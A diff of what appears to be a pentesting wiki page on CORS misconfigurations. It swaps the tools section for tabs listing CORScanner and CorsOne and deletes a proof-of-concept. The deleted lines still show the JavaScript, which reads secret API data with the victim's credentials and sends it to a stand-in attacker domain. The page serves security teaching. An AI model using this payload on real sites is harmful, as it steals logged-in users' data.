@@ -73,38 +73,24 @@ Check [James Kettle](https://portswigger.net/research/exploiting-cors-misconfigu
 
 During a penetration test, exploiting CORS misconfigurations is difficult. The attacks may rely on manipulating a victim or even finding configuration issues on other domains (which can be out of scope).
 
-However, it's possible to get a Proof-of-Concept using JavaScript by registring a domain (to abuse a CORS misconfiguration).
+However, it's possible to get a Proof-of-Concept using JavaScript by regisetring a domain (to abuse a CORS misconfiguration).
 
-### Tool
 
-The tool [CORScanner ](https://github.com/chenjj/CORScanner)is useful in finding misconfigurations. It relies on the table shown in the misconfiguration case 1.
+### Tools
 
-```bash
-python cors_scan.py -u $URL
-```
+:::tabs
 
-> [!TIP]
-> It is advised to use the verbose option `-v` to see the tests.
+== CORScanner
 
-> [!WARNING]
-> It is possible to customize the third parties origins in the file `origins.json`.
+The tool [CORScanner ](https://github.com/chenjj/CORScanner) is useful in finding misconfigurations. It relies on the table shown in the misconfiguration case 1.
 
-### Proof-of-Concept (PoC)
+== CorsOne
 
-To steal sensitive information, the victim has to be logged in the vulnerable website. From there, if the victim is redirected to the attacker's website (containing the script below), the sensitive information will be retrieved by the attacker.
+The tool [CorsOne](https://github.com/omranisecurity/CorsOne) is a fast and accurate utility for detecting CORS misconfigurations, featuring multiple built-in test cases and automated checks for common bypass scenarios.
 
-```javascript
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://vulnerable.domain/api/secret-data',true); 
-req.withCredentials = true;
-req.send();
+:::
 
-function reqListener() {
-    location='//atttacker.domain/log?response='+this.responseText; 
-};
-```
-
+---
 ## Resources
 
 [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
